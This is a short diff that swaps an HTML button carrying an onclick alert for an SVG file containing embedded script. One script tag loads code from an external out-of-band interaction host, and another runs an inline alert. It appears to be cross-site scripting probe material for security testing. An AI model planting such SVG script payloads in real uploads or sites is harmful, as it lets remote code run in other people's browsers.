@@ -1,6 +1,18 @@
-<button onclick="alert('XSS attack!')">
-  <img src="image.png" alt="Image">
-  <svg width="100" height="100">
-    <rect x="0" y="0" width="100" height="100" fill="#E77D19" />
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC
+  "-//W3C//DTD SVG 1.1//EN"
+  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+  <svg width="200"
+       height="200"
+       zoomAndPan="disable"
+       xmlns="http://www.w3.org/2000/svg"
+       xmlns:xlink="http://www.w3.org/1999/xlink"
+       xml:space="preserve">
+    <!-- Script linked from the outside-->
+    <script xlink:href="https://co5tannbpdas73a87sm0j3i9rctjnypcx.oast.fun" />
+    <script>
+      //<![CDATA[
+        alert("ble");
+      ]]>
+    </script>
   </svg>
-</button>
